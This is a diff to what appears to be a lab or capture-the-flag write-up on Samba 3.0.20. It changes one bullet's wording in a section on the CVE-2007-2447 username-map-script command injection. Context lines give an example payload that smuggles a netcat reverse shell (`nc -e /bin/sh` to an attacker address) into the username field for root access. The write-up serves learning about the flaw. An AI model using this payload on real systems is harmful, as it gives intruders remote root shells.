@@ -132,7 +132,7 @@ The primary vulnerability exploited here is **[CVE-2010-0926](https://nvd.nist.g
 
 While our primary attack path focused on the logical flaw of symlink traversal, it is worth noting that **Samba 3.0.20** is also famously vulnerable to a remote code execution (RCE) flaw, [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). This vulnerability exists in the way Samba handles the `username map script` configuration option.
 
-- **The Flaw:** The service fails to properly sanitize shell metacharacters in the username field.
+- **The Flaw:** The service fails to sanitize shell metacharacters in the username field properly.
 - **The Payload:** An attacker can provide a username containing shell commands wrapped in backticks (e.g., `nohup nc -e /bin/sh 10.0.2.2 4444`).
 - **The Result:** Because the script runs with root privileges, the injected command is executed by the system shell immediately upon the login attempt, granting an instant root shell.
 
